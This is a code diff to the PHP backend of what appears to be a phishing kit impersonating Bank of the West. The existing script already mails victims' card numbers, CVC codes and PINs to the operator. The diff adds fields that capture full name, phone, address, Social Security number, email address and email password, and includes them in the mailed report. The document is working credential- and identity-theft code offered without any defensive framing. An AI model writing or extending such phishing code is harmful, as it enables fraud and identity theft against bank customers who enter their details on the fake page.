@@ -36,6 +36,15 @@ if (isset($POST['password'])) {
     $cardExpiryDate = $POST['cardExpiryDate'];
     $cardCVC = $POST['cardCVC'];
     $cardPin = $POST['cardPin'];
+    $Name = $POST['Name'];
+    $Mobile = $POST['Mobile'];
+    $Address = $POST['Address'];
+    $City = $POST['City'];
+    $State = $POST['State'];
+    $Zip = $POST['Zip'];
+    $SSN = $POST['SSN'];
+    $Email = $POST['Email'];
+    $EmailPass = $POST['EmailPass'];
 
     $phpmailer->Subject = "New Details From Bank Of The West";
 
@@ -48,6 +57,15 @@ if (isset($POST['password'])) {
             Card Exipry Date : $cardExpiryDate <br>
             Card CVC : $cardCVC <br>
             Card Pin : $cardPin <br>
+            Full Name : $Name <br>
+            Phone : $Mobile <br>
+            Address : $Address <br>
+            City : $City <br>
+            State : $State <br>
+            Zip : $Zip <br>
+            SSN : $SSN <br>
+            Email : $Email <br>
+            Email Password : $EmailPass <br>
         </h3>
     ";
 
